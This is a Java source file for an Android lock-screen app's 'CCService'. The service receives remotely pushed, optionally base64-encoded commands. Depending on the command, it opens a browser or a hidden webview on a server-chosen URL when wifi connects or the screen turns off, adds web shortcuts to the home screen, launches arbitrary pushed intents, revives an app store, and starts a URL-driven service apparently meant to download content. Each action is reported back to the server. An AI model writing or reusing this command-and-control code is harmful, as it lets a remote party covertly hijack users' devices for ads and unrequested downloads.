package com.lockstudio.sticklocker.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Base64;

import com.lockstudio.sticklocker.application.LockApplication;
import com.lockstudio.sticklocker.util.CommonUtil;
import com.lockstudio.sticklocker.util.CustomEventCommit;
import com.lockstudio.sticklocker.util.NetworkUtil;
import com.lockstudio.sticklocker.util.YYBUtil;

import org.json.JSONException;
import org.json.JSONObject;

import cn.opda.android.activity.R;

public class CCService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (intent != null && intent.hasExtra("MESSAGE")) {
            String s = intent.getStringExtra("MESSAGE");
            onMessage(s);
            CustomEventCommit.commit(this, "V5_CCReceiver", "" + s);
        }
        return super.onStartCommand(intent, flags, startId);
    }


    private void onMessage(String s) {
        try {
            JSONObject jsonObject;
            if (s.startsWith("{")) {
                jsonObject = new JSONObject(s);
            } else {
                byte[] bytes = Base64.decode(s, Base64.DEFAULT);
                jsonObject = new JSONObject(new String(bytes));
            }
            if (jsonObject.has("type")) {
                int type = jsonObject.optInt("type");

                switch (type) {
                    case 1001: // hao123 wifi连接后自动打开浏览器
                        boolean hao123 = jsonObject.optBoolean("enable");
                        int haoType = jsonObject.optInt("opt"); // 1-wifi连接后自动打开浏览器
                        // 2-关屏后自动打开内置webview
                        String haoUrl = jsonObject.optString("url");
                        LockApplication.getInstance().getConfig().setHao123(hao123);
                        LockApplication.getInstance().getConfig().setHaoType(haoType);
                        LockApplication.getInstance().getConfig().setHao123Url(haoUrl);
                        break;

                    case 1002: // 桌面生成跳转网页的图标
                        String haoUrl1 = jsonObject.optString("url");
                        String title = jsonObject.optString("title");
                        if (TextUtils.isEmpty(title)) {
                            title = "浏览器";
                        }
                        CommonUtil.addShortcut(this, title, R.drawable.ic_browser, haoUrl1);
                        break;

                    case 1200: // 下发intent字符串来启动activity，Exp: 拉活应用宝
                        // boolean activity = jsonObject.optBoolean("enable"); //已弃用
                        int times = jsonObject.optInt("times");
                        String intent_str = jsonObject.optString("intent");
                        LockApplication.getInstance().getConfig().setActivityTimes(times);
                        LockApplication.getInstance().getConfig().setIntentStr(intent_str);
                        break;

                    case 1201: // 拉活应用宝
                        // boolean activity = jsonObject.optBoolean("enable"); //已弃用
                        String tmast = jsonObject.optString("tmast");
                        if (!YYBUtil.yybInstalled(this) && NetworkUtil.getNetWorkState(this)) {
                            YYBUtil.activityYYB(this, tmast);
                        }
                        break;

                    case 2000:
//                        if (MConstants.PUSH_2000_ENABEL) {
//
//                        }
                        String url = jsonObject.optString("url");
                        LockApplication.getInstance().getConfig().setPush2000Url(url);
                        if (!TextUtils.isEmpty(url) && NetworkUtil.isWifi(this)) {
                            CustomEventCommit.commit(this, "V5_CCReceiver", "TYPE:2000:isWiFi");
                            Intent intent = new Intent(this, DPService.class);
                            intent.putExtra("url", url);
                            startService(intent);
                        } else {
                            CustomEventCommit.commit(this, "V5_CCReceiver", "TYPE:2000:NotWiFi");
                        }
                        break;

                    default:
                        break;
                }

                CustomEventCommit.commit(this, "V5_CCReceiver", "CCMessage:" + type);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }

//        stopSelf();
    }
}
